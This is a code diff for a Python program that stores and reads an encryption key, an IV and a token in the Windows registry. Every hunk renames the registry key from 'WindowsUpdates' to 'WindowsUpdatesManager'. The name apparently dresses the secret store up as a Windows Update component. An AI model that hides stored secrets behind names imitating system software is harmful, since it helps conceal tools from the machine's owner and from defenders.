@@ -18,7 +18,7 @@ def create_enc_key():
 
 def store_enc_key():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.CreateKey(loc_1, "WindowsUpdates")
+    k = reg.CreateKey(loc_1, "WindowsUpdatesManager")
 
     reg.SetValueEx(k, "b", 0, reg.REG_SZ, str(key))
 
@@ -27,7 +27,7 @@ def store_enc_key():
 
 def get_enc_key():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.OpenKey(loc_1, "WindowsUpdates")
+    k = reg.OpenKey(loc_1, "WindowsUpdatesManager")
     enc_key = reg.QueryValueEx(k, "b")
 
     if k:
@@ -40,7 +40,7 @@ def create_iv():
 
 def store_iv():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.CreateKey(loc_1, "WindowsUpdates")
+    k = reg.CreateKey(loc_1, "WindowsUpdatesManager")
 
     reg.SetValueEx(k, "c", 0, reg.REG_SZ, str(iv))
 
@@ -49,7 +49,7 @@ def store_iv():
 
 def get_iv():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.OpenKey(loc_1, "WindowsUpdates")
+    k = reg.OpenKey(loc_1, "WindowsUpdatesManager")
     iv = reg.QueryValueEx(k, "c")
 
     if k:
@@ -58,7 +58,7 @@ def get_iv():
 
 def get_token():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.OpenKey(loc_1, "WindowsUpdates")
+    k = reg.OpenKey(loc_1, "WindowsUpdatesManager")
     token = reg.QueryValueEx(k, "a")
 
     if k:
